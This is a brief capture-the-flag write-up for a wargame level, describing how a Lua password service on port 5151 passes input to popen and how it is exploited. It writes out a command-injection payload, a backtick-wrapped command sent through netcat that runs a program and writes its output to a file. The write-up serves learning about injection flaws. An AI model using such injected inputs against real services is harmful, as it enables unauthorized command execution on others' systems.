# Level 09 Vulnerability Exploit Documentation

## Observations
a .lua file gave a hint about a possible vulnerability.
a server is running on port 5151 when we request it it ask a password 
```bash
nc localhost 5151
password: 
```

## Exploitation Steps
after checking the file level11.lua we found that the password is being hached then checked with "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0"

anyway in both cases nothing hapend.

the code contain a function hash(pass), which is using popen to execute system's command , this the vulnerability we are looking for.

we pass the `getflag` as argument then it will be executed by echo redirecting the output to /tmp/flag

```bash 
>$ nc localhost 5151
password: `getflag` > /tmp/flag
>$ cat /tmp/flag
Check flag.Here is your token : xxxxxxxxx
```

